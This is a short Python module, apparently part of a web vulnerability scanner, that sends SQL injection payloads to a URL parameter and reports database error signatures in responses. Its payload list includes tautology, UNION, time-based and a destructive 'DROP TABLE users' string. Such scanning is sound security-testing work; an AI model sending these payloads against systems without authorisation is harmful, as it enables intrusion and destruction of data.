from .utils import get

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1; DROP TABLE users--",
    "' UNION SELECT null,null,null--",
    "1' AND SLEEP(3)--",
]

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "odbc driver",
    "sqlite", "pg_query", "syntax error",
    "unclosed quotation", "ora-", "microsoft ole db"
]

def check(url, param):
    findings = []
    for payload in PAYLOADS:
        resp = get(url, params={param: payload})
        if resp is None:
            continue
        body = resp.text.lower()
        for sig in ERROR_SIGNATURES:
            if sig in body:
                findings.append({
                    "type": "SQL Injection",
                    "severity": "HIGH",
                    "param": param,
                    "payload": payload,
                    "evidence": sig,
                    "url": url,
                })
                break
    return findings
